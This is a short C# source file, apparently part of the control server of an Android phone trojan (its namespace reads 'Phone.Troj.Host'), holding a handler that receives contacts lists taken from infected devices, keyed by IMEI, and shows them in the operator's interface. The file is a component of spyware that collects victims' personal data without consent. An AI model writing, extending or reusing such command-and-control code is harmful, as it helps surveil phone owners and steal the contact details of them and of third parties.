using InOut;
using InOut.PacketImp;

namespace IIE.Phone.Troj.Host.Handler
{
    public class ContactsHandler:IPacketHandler
    {
        private readonly IMainView gui;
        private readonly int channel;
        private readonly string imei;

        public ContactsHandler(int chan, string imei, IMainView gui)
        {
            channel = chan;
            this.imei = imei;
            this.gui = gui;
        }


        public void Receive(IPacket p, string imeiId)
        {
            
        }



        public void HandlePacket(IPacket p, string tempIMEI, Server c)
        {
            gui.Log.LogTxt("Contacts data has been received");
            c.ChannelHandlerMap[imei].RemoveListener(channel);
            var packet = (ContactsPacket)p;
            gui.UpdateContacts(imei, packet.List);
        }
    }
}
